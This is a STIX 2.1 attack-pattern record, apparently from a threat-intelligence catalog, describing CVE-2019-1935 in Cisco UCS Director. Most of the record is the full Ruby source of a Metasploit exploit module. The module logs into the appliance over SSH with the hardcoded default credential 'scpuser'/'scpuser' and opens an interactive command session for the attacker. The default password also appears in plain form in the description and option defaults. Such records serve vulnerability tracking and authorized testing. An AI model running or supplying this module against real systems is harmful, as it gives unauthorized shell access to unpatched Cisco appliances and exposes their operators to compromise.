{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--130d9a39-ffe4-4e4d-9390-40e3122d65b7",
    "created": "2024-08-14T16:58:04.813298Z",
    "modified": "2024-08-14T16:58:04.813302Z",
    "name": "Cisco UCS Director default scpuser password",
    "description": " This module abuses a known default password on Cisco UCS Director. The 'scpuser' has the password of 'scpuser', and allows an attacker to login to the virtual appliance via SSH. This module  has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0. Note that Cisco also mentions in their advisory that their IMC Supervisor and UCS Director Express are also affected by these vulnerabilities, but this module was not tested with those products.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/cisco_ucs_scpuser.rb",
            "external_id": "cisco_ucs_scpuser.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1935"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-usercred"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Aug/36"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-ucs-rce.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco UCS Director default scpuser password',\n        'Description' => %q{\n          This module abuses a known default password on Cisco UCS Director. The 'scpuser'\n          has the password of 'scpuser', and allows an attacker to login to the virtual appliance\n          via SSH.\n          This module  has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.\n          Note that Cisco also mentions in their advisory that their IMC Supervisor and\n          UCS Director Express are also affected by these vulnerabilities, but this module\n          was not tested with those products.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2019-1935' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-usercred' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Aug/36' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-ucs-rce.txt' ]\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'Cisco UCS Director < 6.7.2.0', {} ],\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-08-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'Username to login with', 'scpuser']),\n        OptString.new('PASSWORD', [true, 'Password to login with', 'scpuser']),\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh)\n      ssh = nil\n      return conn\n    end\n\n    return nil\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login to the Cisco appliance...\")\n    conn = do_login(user, pass)\n    if conn\n      print_good(\"#{rhost}:#{rport} - Login Successful (#{user}:#{pass})\")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-08-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}